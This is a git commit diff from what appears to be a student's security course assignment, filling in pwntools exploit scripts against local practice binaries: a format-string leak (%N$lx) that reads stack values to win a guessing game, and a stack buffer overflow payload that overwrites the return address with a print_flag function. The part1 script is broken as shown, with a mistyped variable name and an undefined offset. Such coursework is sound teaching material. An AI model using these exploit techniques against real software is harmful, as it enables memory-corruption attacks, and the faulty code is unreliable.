4e72bf21b4e34685c08b846c534b89b83ddde581
Janie Kuang <115139465+dinothaurs@users.noreply.github.com>
2025-11-05 16:15:29 +0000

    add rest of files

--- assignment-2/1-format-me/part1.py
+++ assignment-2/1-format-me/part1.py
@@ -1,6 +1,9 @@
 #!/usr/bin/env python3
 from pwn import *
 
+#%9$lx
+#p/x code
+
 context.terminal = ['tmux', 'splitw', '-h']
 exe = ELF("./format-me-test")
 
@@ -9,15 +12,29 @@ r = process([exe.path])
 
 for _ in range(10):
     # Add your code Here
-    r.recvuntil(b"xxx") # Think about what should be received first?
-    r.sendline(b"xxx") # Add your format string code here!
-    leak = r.recvline()
-    # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
-    val = leak[idx_1:idx_2] # you need to fill in idx_1, and idx_2 by yourself
+    r.recvuntil(b"Recipient? ") # Think about what should be received first?
+    format_string= f"%{FORMAT_OFFSET}$lx".encode()
+    r.sendline(format)string) # Add your format string code here!
     
-    r.recvuntil(b"xxx") #Think about what should be received?
-    r.sendline(val) 
+    response = r.recvuntil(b"...\n")
+    response_str = response.decode()
+
+    start_idx = len("Sending to ")
+    end_idx = response_str.find("...")
+    hex_val = response_str[start_idx:end_idx].strip()
+
+    val = int(hex_val, 16)
+    r.recvuntil(b"Guess? ")
+    r.sendline(str(val).encode())
     r.recvuntil(b"Correct")
+
+    # leak = r.recvline()
+    # # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
+    # val = leak[idx_1:idx_2] # you need to fill in idx_1, and idx_2 by yourself
+    
+    # r.recvuntil(b"xxx") #Think about what should be received?
+    # r.sendline(val) 
+    # r.recvuntil(b"Correct")
 
 r.recvuntil(b"Here's your flag: ")
 r.interactive()
--- assignment-2/2-overflow-the-world/part2.py
+++ assignment-2/2-overflow-the-world/part2.py
@@ -8,7 +8,11 @@ r = process([exe.path])
 
 win = exe.symbols["print_flag"]
 #write your payload here, prompt: it should be overwrite the saved base pointer (rbp), positioning the payload right at the saved return address, then add p64(win).
-# payload = 
+padding = b"A" * 64           
+saved_rbp = b"B" * 8         
+return_address = p64(win)  
+
+payload = padding + saved_rbp + return_address
 
 r.recvuntil(b"What's your name? ")
 r.sendline(payload)
